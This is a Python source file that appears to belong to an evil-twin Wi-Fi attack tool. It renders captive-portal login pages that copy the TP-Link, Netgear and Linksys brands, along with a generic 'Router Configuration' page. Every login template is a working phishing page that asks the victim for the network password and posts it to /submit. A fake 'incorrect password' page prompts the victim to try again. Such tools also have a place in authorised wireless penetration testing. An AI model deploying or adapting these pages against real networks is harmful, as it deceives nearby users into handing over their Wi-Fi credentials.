#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Template system for captive portal.

Provides template rendering with support for multiple portal styles.
"""

import html
import os

from ...util.logger import log_error, log_debug


class TemplateRenderer:
    """
    Template renderer for captive portal pages.
    
    Supports multiple template styles and variable substitution.
    """
    
    def __init__(self, template_name='generic', target_ssid='', custom_vars=None):
        """
        Initialize template renderer.
        
        Args:
            template_name: Name of template to use (generic, tplink, netgear, linksys)
            target_ssid: SSID of target network
            custom_vars: Optional dictionary of custom variables for templates
        """
        self.template_name = template_name
        self.target_ssid = target_ssid
        self.custom_vars = custom_vars or {}
        
        # Get portal directory
        self.portal_dir = os.path.dirname(os.path.abspath(__file__))
        self.templates_dir = os.path.join(self.portal_dir, 'templates')
        
        log_debug('TemplateRenderer', f'Initialized with template: {template_name}')
    
    def render_login(self) -> str:
        """
        Render login page.
        
        Returns:
            HTML string for login page
        """
        try:
            # Try to load template file
            template_file = os.path.join(self.templates_dir, f'{self.template_name}_login.html')
            
            if os.path.exists(template_file):
                with open(template_file, 'r') as f:
                    template = f.read()
                log_debug('TemplateRenderer', f'Loaded template from {template_file}')
            else:
                # Fall back to built-in template
                template = self._get_builtin_login_template()
                log_debug('TemplateRenderer', f'Using built-in {self.template_name} template')
            
            # Substitute variables
            html = self._substitute_variables(template)
            
            return html
            
        except Exception as e:
            log_error('TemplateRenderer', f'Error rendering login page: {e}', e)
            # Return basic fallback
            return self._get_basic_fallback_login()
    
    def render_success(self) -> str:
        """
        Render success page.
        
        Returns:
            HTML string for success page
        """
        try:
            template_file = os.path.join(self.templates_dir, f'{self.template_name}_success.html')
            
            if os.path.exists(template_file):
                with open(template_file, 'r') as f:
                    template = f.read()
            else:
                template = self._get_builtin_success_template()
            
            html = self._substitute_variables(template)
            return html
            
        except Exception as e:
            log_error('TemplateRenderer', f'Error rendering success page: {e}', e)
            return self._get_basic_fallback_success()
    
    def render_error(self) -> str:
        """
        Render error page.
        
        Returns:
            HTML string for error page
        """
        try:
            template_file = os.path.join(self.templates_dir, f'{self.template_name}_error.html')
            
            if os.path.exists(template_file):
                with open(template_file, 'r') as f:
                    template = f.read()
            else:
                template = self._get_builtin_error_template()
            
            html = self._substitute_variables(template)
            return html
            
        except Exception as e:
            log_error('TemplateRenderer', f'Error rendering error page: {e}', e)
            return self._get_basic_fallback_error()
    
    def _substitute_variables(self, template: str) -> str:
        """
        Substitute variables in template.
        
        Args:
            template: Template string with {{variable}} placeholders
            
        Returns:
            Template with variables substituted
        """
        # Build variables dictionary
        variables = {
            'ssid': self.target_ssid or 'Wireless Network',
            'router_name': 'Router',
            'router_model': 'Wireless Router',
            'router_ip': '192.168.100.1',
        }
        
        # Add custom variables
        variables.update(self.custom_vars)
        
        # Substitute variables. Values (notably the target SSID, which comes
        # from the air and is attacker-influenceable) are HTML-escaped to
        # prevent attribute/markup injection into the served portal pages and
        # to render correctly for SSIDs containing & < > " '.
        result = template
        for key, value in variables.items():
            placeholder = '{{' + key + '}}'
            result = result.replace(placeholder, html.escape(str(value), quote=True))

        return result
    
    def _get_builtin_login_template(self) -> str:
        """Get built-in login template based on template_name."""
        if self.template_name == 'tplink':
            return self._get_tplink_login()
        elif self.template_name == 'netgear':
            return self._get_netgear_login()
        elif self.template_name == 'linksys':
            return self._get_linksys_login()
        else:
            return self._get_generic_login()
    
    def _get_builtin_success_template(self) -> str:
        """Get built-in success template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 500px;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        .success-icon {
            width: 80px;
            height: 80px;
            background: #28a745;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 48px;
            color: white;
        }
        h1 {
            color: #28a745;
            margin: 0 0 20px 0;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin: 10px 0;
        }
        .network-name {
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✓</div>
        <h1>Connected Successfully!</h1>
        <p>You have been connected to <span class="network-name">{{ssid}}</span></p>
        <p>You can now access the internet.</p>
    </div>
</body>
</html>'''
    
    def _get_builtin_error_template(self) -> str:
        """Get built-in error template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Failed</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 500px;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        .error-icon {
            width: 80px;
            height: 80px;
            background: #dc3545;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 48px;
            color: white;
        }
        h1 {
            color: #dc3545;
            margin: 0 0 20px 0;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin: 10px 0;
        }
        .retry-button {
            display: inline-block;
            margin-top: 20px;
            padding: 12px 30px;
            background: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 6px;
            font-weight: bold;
            transition: background 0.3s;
        }
        .retry-button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-icon">✗</div>
        <h1>Connection Failed</h1>
        <p>The password you entered is incorrect.</p>
        <p>Please check your password and try again.</p>
        <a href="/" class="retry-button">Try Again</a>
    </div>
</body>
</html>'''
    
    def _get_generic_login(self) -> str:
        """Get generic router login template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>{{router_name}} - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        .form-container {
            padding: 40px 30px;
        }
        .info-box {
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 4px;
        }
        .info-box p {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        .submit-button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .submit-button:active {
            transform: translateY(0);
        }
        .network-info {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        .network-info p {
            color: #999;
            font-size: 13px;
        }
        .network-name {
            color: #667eea;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <h1>🔒 Router Configuration</h1>
            <p>Wireless Network Setup</p>
        </div>
        <div class="form-container">
            <div class="info-box">
                <p>To continue, please enter your network credentials. This is required to configure your connection settings.</p>
            </div>
            <form method="POST" action="/submit">
                <div class="form-group">
                    <label for="ssid">Network Name (SSID)</label>
                    <input type="text" id="ssid" name="ssid" value="{{ssid}}" required>
                </div>
                <div class="form-group">
                    <label for="password">Network Password</label>
                    <input type="password" id="password" name="password" required placeholder="Enter your password">
                </div>
                <button type="submit" class="submit-button">Connect to Network</button>
            </form>
            <div class="network-info">
                <p>Connecting to: <span class="network-name">{{ssid}}</span></p>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    def _get_tplink_login(self) -> str:
        """Get TP-Link style login template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>TP-Link Wireless Router</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .header {
            background: #00a8e1;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 4px 4px 0 0;
        }
        .header h1 {
            font-size: 20px;
            margin: 0;
        }
        .content {
            padding: 30px;
        }
        .info {
            background: #fffbcc;
            border: 1px solid #e6db55;
            padding: 10px;
            margin-bottom: 20px;
            font-size: 13px;
            border-radius: 3px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #333;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #00a8e1;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover {
            background: #0090c0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>TP-Link Wireless Router</h1>
        </div>
        <div class="content">
            <div class="info">
                Please enter your wireless network credentials to continue.
            </div>
            <form method="POST" action="/submit">
                <div class="form-group">
                    <label>Wireless Network Name:</label>
                    <input type="text" name="ssid" value="{{ssid}}" required>
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit">Connect</button>
            </form>
        </div>
    </div>
</body>
</html>'''
    
    def _get_netgear_login(self) -> str:
        """Get Netgear style login template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>NETGEAR Router Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1e3a5f;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 420px;
            margin: 50px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .header {
            background: #1e3a5f;
            color: white;
            padding: 25px;
            text-align: center;
            border-radius: 8px 8px 0 0;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .content {
            padding: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1e3a5f;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #2a4d7a;
        }
        .note {
            margin-top: 20px;
            padding: 10px;
            background: #f5f5f5;
            border-radius: 4px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">NETGEAR</div>
            <div>Wireless Router</div>
        </div>
        <div class="content">
            <form method="POST" action="/submit">
                <div class="form-group">
                    <label>Network Name (SSID):</label>
                    <input type="text" name="ssid" value="{{ssid}}" required>
                </div>
                <div class="form-group">
                    <label>Network Key (Password):</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            <div class="note">
                Enter your wireless network credentials to access router settings.
            </div>
        </div>
    </div>
</body>
</html>'''
    
    def _get_linksys_login(self) -> str:
        """Get Linksys style login template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Linksys Smart Wi-Fi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: "Segoe UI", Arial, sans-serif;
            background: #f7f7f7;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            margin: 50px auto;
            background: white;
            border-radius: 6px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .header {
            background: linear-gradient(to right, #0066cc, #0099ff);
            color: white;
            padding: 30px;
            text-align: center;
            border-radius: 6px 6px 0 0;
        }
        .logo {
            font-size: 26px;
            font-weight: 300;
            letter-spacing: 2px;
        }
        .subtitle {
            font-size: 14px;
            margin-top: 5px;
            opacity: 0.9;
        }
        .content {
            padding: 35px;
        }
        .welcome {
            text-align: center;
            margin-bottom: 25px;
            color: #666;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: #555;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 11px;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #0066cc;
        }
        button {
            width: 100%;
            padding: 13px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #0055aa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">LINKSYS</div>
            <div class="subtitle">Smart Wi-Fi</div>
        </div>
        <div class="content">
            <div class="welcome">
                <p>Connect to your wireless network</p>
            </div>
            <form method="POST" action="/submit">
                <div class="form-group">
                    <label>Network Name</label>
                    <input type="text" name="ssid" value="{{ssid}}" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required placeholder="Enter network password">
                </div>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </div>
</body>
</html>'''
    
    def _get_basic_fallback_login(self) -> str:
        """Get basic fallback login page."""
        return '''<!DOCTYPE html>
<html><head><title>Login</title></head>
<body><h1>Router Login</h1>
<form method="POST" action="/submit">
<p>SSID: <input type="text" name="ssid" value="{{ssid}}"></p>
<p>Password: <input type="password" name="password"></p>
<p><button type="submit">Connect</button></p>
</form></body></html>'''
    
    def _get_basic_fallback_success(self) -> str:
        """Get basic fallback success page."""
        return '''<!DOCTYPE html>
<html><head><title>Success</title></head>
<body><h1>Connected!</h1><p>You are now connected.</p></body></html>'''
    
    def _get_basic_fallback_error(self) -> str:
        """Get basic fallback error page."""
        return '''<!DOCTYPE html>
<html><head><title>Error</title></head>
<body><h1>Error</h1><p>Invalid password. <a href="/">Try again</a></p></body></html>'''


def get_available_templates():
    """
    Get list of available template names.
    
    Returns:
        List of template names
    """
    return ['generic', 'tplink', 'netgear', 'linksys']
